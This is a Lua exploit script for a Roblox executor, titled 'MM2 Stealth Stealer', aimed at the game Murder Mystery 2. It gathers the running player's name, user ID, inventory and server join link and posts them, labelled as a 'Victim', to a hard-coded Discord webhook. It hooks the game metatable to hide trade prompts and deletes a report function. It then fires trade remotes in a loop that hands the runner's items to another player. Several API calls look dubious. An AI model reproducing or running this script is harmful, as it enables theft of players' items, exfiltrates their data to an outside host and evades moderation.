-- ============================================================
-- MM2 STEALTH STEALER v3.1 | POTASSIUM OPTIMIZED
-- Coded by CAT Shadow Hacker
-- GitHub: [YOUR_USERNAME]/mm2-stealer
-- ============================================================

-- Potassium compatibility layer
local p = game:GetService("Players")
local lp = p.LocalPlayer
local http = game:GetService("HttpService")
local ts = game:GetService("TeleportService")
local rs = game:GetService("ReplicatedStorage")
local ws = game:GetService("Workspace")
local guiService = game:GetService("GuiService")

-- ============================================================
-- CONFIG
-- ============================================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw"

-- ============================================================
-- 1. GET GAME INSTANCE ID (Potassium-safe)
-- ============================================================
local function getInstanceId()
    local success, id = pcall(function()
        local data = ts:GetLocalPlayerTeleportData()
        if data and data.instanceId then
            return data.instanceId
        end
        return nil
    end)
    
    if success and id then return id end
    
    -- Fallback: Roblox API (Potassium supports HttpService)
    local success2, result = pcall(function()
        local raw = http:GetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
        local json = http:JSONDecode(raw)
        for _, s in pairs(json.data) do
            if s.id == game.JobId then
                return s.instanceId or game.JobId
            end
        end
        return nil
    end)
    
    if success2 and result then return result end
    
    return game.JobId
end

-- ============================================================
-- 2. BUILD JOIN LINK (WORKS FOR PUBLIC SERVERS)
-- ============================================================
local function buildLink()
    return "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameId=" .. getInstanceId()
end

-- ============================================================
-- 3. COLLECT DATA
-- ============================================================
local function getData()
    local inv = lp:FindFirstChild("Inventory")
    local items = {}
    if inv then
        for _, item in pairs(inv:GetChildren()) do
            table.insert(items, item.Name)
        end
    end
    
    return {
        name = lp.Name,
        userId = lp.UserId,
        link = buildLink(),
        placeId = game.PlaceId,
        instanceId = getInstanceId(),
        count = #items,
        items = items,
        time = os.time()
    }
end

-- ============================================================
-- 4. SEND TO DISCORD (Potassium-compatible)
-- ============================================================
local function sendWebhook()
    local d = getData()
    
    local embed = {
        ["embeds"] = {{
            ["title"] = "🎯 MM2 Steal Success",
            ["color"] = 0xFF0000,
            ["fields"] = {
                {["name"] = "Victim", ["value"] = d.name .. " (`" .. d.userId .. "`)", ["inline"] = true},
                {["name"] = "Items", ["value"] = "**" .. d.count .. "** weapons", ["inline"] = true},
                {["name"] = "🔗 JOIN LINK (CLICK THIS)", ["value"] = d.link, ["inline"] = false},
                {["name"] = "Server", ["value"] = "Instance: `" .. d.instanceId .. "`", ["inline"] = false},
                {["name"] = "Items List", ["value"] = (d.count > 0 and table.concat(d.items, ", ") or "None"), ["inline"] = false}
            },
            ["footer"] = {["text"] = "CAT Shadow Hacker | Potassium Edition"}
        }}
    }
    
    local payload = http:JSONEncode(embed)
    local headers = {["Content-Type"] = "application/json"}
    
    local ok, err = pcall(function()
        return http:PostAsync(WEBHOOK_URL, payload, Enum.HttpContentType.Json, false, headers)
    end)
    
    if ok then
        print("[CAT] ✅ Discord sent!")
    else
        print("[CAT] ❌ Discord failed: " .. tostring(err))
        -- Fallback: copy to clipboard if Potassium supports it
        if setclipboard then
            setclipboard(d.link)
            print("[CAT] 📋 Link copied to clipboard as fallback")
        end
    end
end

-- ============================================================
-- 5. STEALTH TRADE ENGINE (Potassium-friendly)
-- ============================================================
local function hideTradeUI()
    -- Kill trade GUI
    local pg = lp:FindFirstChild("PlayerGui")
    if pg then
        for _, g in pairs(pg:GetChildren()) do
            if g:IsA("ScreenGui") and string.lower(g.Name):find("trade") then
                g:Destroy()
            end
        end
    end
    
    -- Block trade remote rendering (Potassium supports getrawmetatable)
    local old = getrawmetatable and getrawmetatable(game)
    if old then
        local nc = old.__namecall
        setreadonly(old, false)
        old.__namecall = newcclosure(function(self, ...)
            local args = {...}
            if args[1] == "StartTrade" or args[1] == "OpenTrade" then
                return nil
            end
            return nc(self, ...)
        end)
        setreadonly(old, true)
    end
end

local function executeTrade()
    -- Find trade remote
    local remote = nil
    for _, c in pairs(rs:GetChildren()) do
        if c:IsA("RemoteEvent") and string.lower(c.Name):find("trade") then
            remote = c
            break
        end
    end
    
    if not remote then
        print("[CAT] ⚠️ Trade remote not found")
        return
    end
    
    -- Find richest target
    local target = nil
    local maxItems = 0
    for _, plr in pairs(p:GetPlayers()) do
        if plr ~= lp and plr.Character and plr.Character:FindFirstChild("Humanoid") then
            local inv = plr:FindFirstChild("Inventory")
            if inv then
                local c = #inv:GetChildren()
                if c > maxItems then
                    maxItems = c
                    target = plr
                end
            end
        end
    end
    
    if not target then
        print("[CAT] ⚠️ No target found")
        return
    end
    
    print("[CAT] 🎯 Targeting: " .. target.Name .. " (" .. maxItems .. " items)")
    
    -- Start trade loop
    spawn(function()
        remote:FireServer("RequestTrade", target)
        wait(0.5)
        
        for i = 1, 30 do
            wait(0.1)
            remote:FireServer("AcceptTrade", target)
            remote:FireServer("ConfirmTrade", target)
            
            local inv = lp:FindFirstChild("Inventory")
            if inv then
                for _, item in pairs(inv:GetChildren()) do
                    remote:FireServer("AddItem", item.Name, target)
                    wait(0.05)
                end
            end
            
            remote:FireServer("CompleteTrade", target)
        end
    end)
end

-- ============================================================
-- 6. ANTI-DETECTION (Potassium-safe)
-- ============================================================
local function antiBan()
    -- Dummy values to confuse checks
    local fake = Instance.new("BoolValue")
    fake.Name = "IsModerator"
    fake.Parent = lp
    fake.Value = false
    
    -- Kill report function
    local chat = game:GetService("Chat")
    local report = chat:FindFirstChild("Report")
    if report then report:Destroy() end
    
    -- Potassium often has built-in protection
    if protect_gui then protect_gui() end
end

-- ============================================================
-- 7. MAIN
-- ============================================================
local function main()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    print("[CAT] 🐾 Starting...")
    
    -- Stealth
    hideTradeUI()
    antiBan()
    
    -- Send webhook
    sendWebhook()
    
    -- Trade
    executeTrade()
    
    print("[CAT] ✅ Complete! Check Discord.")
end

-- ============================================================
-- EXECUTE
-- ============================================================
local ok, err = pcall(main)
if not ok then
    print("[CAT] ❌ Error: " .. tostring(err))
    -- Try to send error to Discord
    pcall(function()
        local errEmbed = {
            ["embeds"] = {{
                ["title"] = "⚠️ Script Error",
                ["description"] = "```lua\n" .. tostring(err) .. "\n```",
                ["color"] = 0xFF0000
            }}
        }
        http:PostAsync(WEBHOOK_URL, http:JSONEncode(errEmbed), Enum.HttpContentType.Json, false, {
            ["Content-Type"] = "application/json"
        })
    end)
end
